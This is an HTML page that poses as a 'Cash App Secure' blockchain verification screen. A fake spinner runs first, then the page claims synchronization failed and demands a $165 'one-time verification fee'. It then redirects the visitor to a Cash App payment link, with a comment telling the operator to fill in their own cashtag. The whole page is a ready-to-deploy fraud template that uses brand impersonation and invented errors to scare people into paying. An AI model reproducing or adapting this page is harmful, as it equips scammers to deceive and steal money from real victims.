<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Blockchain Verification</title>
    <style>
        /* Mobile-First Base */
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
        body { background-color: #080b0d; color: #ffffff; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
        .container { width: 90%; max-width: 400px; text-align: center; }

        /* Loader Animation */
        .spinner {
            width: 60px; height: 60px;
            border: 4px solid rgba(0, 214, 50, 0.1);
            border-top: 4px solid #00d632;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 30px;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        /* Icon State (Hidden initially) */
        .error-icon { font-size: 60px; color: #ff5f5f; margin-bottom: 25px; display: none; }

        /* Typography */
        h1 { font-size: 24px; font-weight: 700; margin-bottom: 15px; }
        p { font-size: 17px; color: #b0b0b0; line-height: 1.6; }
        .fee-highlight { color: #ff5f5f; font-weight: 700; }

        /* Footer Branding */
        .footer { position: absolute; bottom: 40px; width: 100%; color: #444; font-size: 14px; font-weight: 600; letter-spacing: 1px; }
    </style>
</head>
<body>

    <div class="container">
        <div id="loader" class="spinner"></div>
        
        <div id="errorIcon" class="error-icon">⚠️</div>

        <h1 id="statusTitle">Syncing with Blockchain...</h1>
        <p id="statusMsg">Connecting to secure verification gateway.</p>
    </div>

    <div class="footer">CASH APP SECURE</div>

    <script>
        // THE LOGIC
        const loader = document.getElementById('loader');
        const errorIcon = document.getElementById('errorIcon');
        const title = document.getElementById('statusTitle');
        const msg = document.getElementById('statusMsg');

        // Replace 'YourCashtag' with your actual Cash App ID
        const cashtag = "YourCashtag"; 
        const amount = "165";

        // Start the 3-second sequence
        setTimeout(() => {
            // 1. Change UI to show the error/fee requirement
            loader.style.display = "none";
            errorIcon.style.display = "block";
            title.innerText = "Payment Required";
            title.style.color = "#ff5f5f";
            msg.innerHTML = `Blockchain synchronization failed.<br>A one-time verification fee of <span class="fee-highlight">$${amount}</span> is required.<br><br>Redirecting to Cash App...`;

            // 2. Wait another 3 seconds for the user to read it, then redirect
            setTimeout(() => {
                window.location.href = `cashme://cash.app/$${cashtag}/${amount}`;
            }, 3000);

        }, 3000); // Initial loading time
    </script>
</body>
</html>
